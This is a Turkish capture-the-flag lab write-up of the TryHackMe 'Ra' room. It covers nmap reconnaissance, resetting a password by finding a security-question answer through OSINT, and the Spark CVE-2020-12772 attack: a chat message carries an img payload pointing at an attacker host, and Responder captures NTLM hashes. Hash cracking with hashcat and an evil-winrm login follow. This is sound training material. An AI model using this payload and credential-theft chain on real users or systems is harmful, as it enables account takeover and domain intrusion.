# TryHackMe — "Ra" Write-up

> **Oda:** Ra (windcorp.thm)
> **Zorluk:** Hard
> **Platform:** Windows / Active Directory (Domain Controller)
> **Hazırlayanlar:** 4ndr34z & demoteaching
> **Ana zafiyet:** CVE-2020-12772 (Ignite Realtime Spark 2.8.3 + ROAR plugin — NTLM hash leak)

---

## 0. Metodoloji

Saldırı dört aşamada ilerliyor:

1. **Reconnaissance** — port taraması, servis keşfi
2. **Enumeration** — web uygulaması, domain isimleri, kullanıcı keşfi
3. **Foothold / Exploitation** — şifre sıfırlama bypass → Spark/XMPP → CVE-2020-12772 ile NTLM hash yakalama
4. **Privilege Escalation** — yakalanan hash'in kırılması ve ayrıcalık yükseltme

---

## 1. Reconnaissance

### Hedef ağa bağlanma
Önce VPN/ağ bağlantısı kurulur ve hedef IP'ye erişim doğrulanır:

```bash
ping <HEDEF-IP>
```

### Port taraması
Açık portları ve servisleri keşfetmek için kapsamlı bir nmap taraması:

```bash
nmap -sC -sV -oN nmap/ra.txt <HEDEF-IP>
# Daha derin tarama için:
nmap -p- -sV -oN nmap/ra-full.txt <HEDEF-IP>
```

Tipik olarak görülecek portlar: bir **web servisi (80/443)**, **DNS (53)**, Active Directory servisleri (Kerberos 88, LDAP 389, SMB 445) ve **XMPP portları (5222/5269/7070/7777)**. XMPP portlarının açık olması, sistemde bir Jabber/XMPP sunucusu (Openfire) çalıştığının ipucudur — Spark bağlantısı buraya yapılacak.

> **Not:** Spark istemcisinin bağlanacağı XMPP portu **5222**'dir. Bu portu nmap çıktısında görmek, foothold yolunun doğru olduğunu teyit eder.

---

## 2. Enumeration

### Domain isimlerini /etc/hosts'a ekleme
Web sitesi incelendiğinde, sayfanın `windcorp.thm` ve `fire.windcorp.thm` gibi alan adlarına referans verdiği görülür. Bu isimlerin çözümlenebilmesi için `/etc/hosts` dosyasına eklenir:

```bash
echo "<HEDEF-IP>   windcorp.thm fire.windcorp.thm" | sudo tee -a /etc/hosts
```

> `fire.windcorp.thm` → XMPP/Openfire sunucusunun domain adıdır. Spark login ekranında "domain" olarak bu kullanılır.

### Web uygulaması keşfi
Web sitesi gezildiğinde bir **"Reset Password" (şifre sıfırlama)** sayfası bulunur. Bu sayfa, kullanıcının kimliğini bir **güvenlik sorusu** ile doğrular (örn. "evcil hayvanınızın adı nedir?").

### OSINT — güvenlik sorusunun cevabı
Şifre sıfırlama için bir hedef kullanıcı ve onun güvenlik sorusunun cevabı gerekir. Site üzerindeki kullanıcı/çalışan bilgileri incelenir:

- Hedef kullanıcı: **Lily Levesque** (`lilyle`)
- Güvenlik sorusu: köpeğinin adı
- Cevap, Lily'nin paylaştığı bir **fotoğrafın URL'sinde** gizlidir — köpeğin adı: **`sparky`**

> **Öğrenme noktası:** Güvenlik soruları zayıf bir kimlik doğrulama yöntemidir; cevap genellikle sosyal medyada/sitede açıkça bulunabilir. Bu klasik bir OSINT adımıdır.

---

## 3. Foothold / Exploitation

### Adım 3.1 — Şifre sıfırlama
Web'deki şifre sıfırlama formunda:
- Kullanıcı: `lilyle`
- Güvenlik sorusu cevabı: `sparky`

girilerek hesabın şifresi saldırganın belirlediği bir değere resetlenir. Artık `lilyle` hesabının geçerli bir kimlik bilgisi vardır.

### Adım 3.2 — Spark XMPP istemcisine giriş
Elde edilen kimlik bilgisiyle **Spark 2.8.3** istemcisine giriş yapılır:

- **Username:** `lilyle`
- **Password:** (resetlenen şifre)
- **Domain / Server:** `windcorp.thm` (gerekirse Advanced → manuel host: `<HEDEF-IP>`, port `5222`)
- **Advanced ayarları:** self-signed sertifika için "Accept all certificates" ve "Disable certificate hostname verification" işaretlenir.

Giriş yapıldığında kişi listesinde (roster) başka kullanıcılar ve yöneticiler görülür.

### Adım 3.3 — CVE-2020-12772 ile NTLM hash yakalama
**Zafiyetin özü:** Spark 2.8.3 + ROAR plugin, bir sohbet mesajı içindeki `<img>` etiketini otomatik olarak yükler. Görselin `src` özelliği harici bir IP'ye işaret ettiğinde, o kullanıcının istemcisi saldırganın sunucusuna **NTLM hash'leriyle birlikte** bir HTTP isteği gönderir.

**Saldırı akışı:**

1. Saldırgan makinede Responder başlatılır (NTLM hash'lerini yakalamak için):

```bash
sudo responder -I tun0
```

2. Spark üzerinden, yönetici/hedef kullanıcıya şu mantıkta bir mesaj gönderilir:

```html
<img src="http://<SALDIRGAN-IP>/pwn.jpg">
```

3. ROAR plugin görseli otomatik önyüklediğinde (ya da kullanıcı tıkladığında), Responder hedef kullanıcının **NetNTLM hash'ini** yakalar.

> **Not:** Bu adım için hedefte etkileşime girecek bir kullanıcı gerekir. Oda, karşı tarafta otomatik yanıt veren/mesaja bakan bir kullanıcı simüle eder.

---

## 4. Privilege Escalation

### Hash'i kırma
Responder ile yakalanan NetNTLMv2 hash'i bir dosyaya kaydedilir ve John / hashcat ile kırılır:

```bash
# John ile:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# veya hashcat ile (NetNTLMv2 = mod 5600):
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Ayrıcalık yükseltme
Kırılan parola, daha yetkili bir kullanıcıya (örn. yöneticiye yakın bir hesaba) aittir. Bu kimlik bilgisiyle sisteme daha yetkili erişim sağlanır (SMB/WinRM/Evil-WinRM gibi yöntemlerle), ve hedef bir **Domain Controller** olduğu için nihai amaç domain üzerinde yetki elde etmektir.

```bash
# Örnek: Evil-WinRM ile oturum
evil-winrm -i <HEDEF-IP> -u <kullanıcı> -p <kırılan-parola>
```

Flag'ler, elde edilen erişim seviyelerine göre ilgili kullanıcı dizinlerinde (Desktop vb.) toplanır.

---

## 5. Araçlar Özeti

| Aşama | Araç |
|-------|------|
| Port tarama | `nmap` |
| Web keşif / OSINT | Tarayıcı, dikkatli gözlem |
| Foothold | Web şifre sıfırlama + **Spark 2.8.3** |
| Hash yakalama | **Responder** (CVE-2020-12772) |
| Hash kırma | `john` / `hashcat` |
| Erişim | `evil-winrm` / `smbclient` |

---

## 6. Temel Çıkarımlar (Takeaways)

- **Güvenlik soruları ≠ güvenlik.** Cevaplar genellikle OSINT ile bulunabilir (bir fotoğraf URL'sinde köpeğin adı gibi).
- **Eski istemci yazılımları ciddi zafiyet taşır.** Spark 2.8.3'ün sürüm numarasını görmek, doğrudan CVE aramaya yönlendirmeli — bu refleks bu odanın kalbindedir.
- **NTLM relay/leak saldırıları** istemci tarafı otomatik kaynak yükleme (burada ROAR'ın `<img>` önyüklemesi) üzerinden çalışır. Responder bu tür hash'leri yakalamak için standart araçtır.
- **Enumeration → domain isimleri → `/etc/hosts`** zinciri atlanırsa servisler hiç çözümlenemez; her yeni domain adı görüldüğünde hosts dosyasını güncellemek alışkanlık olmalı.

---

*Bu belge öğrenme/metodoloji amaçlıdır; spesifik flag değerleri ve hedefe özel parolalar bilinçli olarak dahil edilmemiştir.*
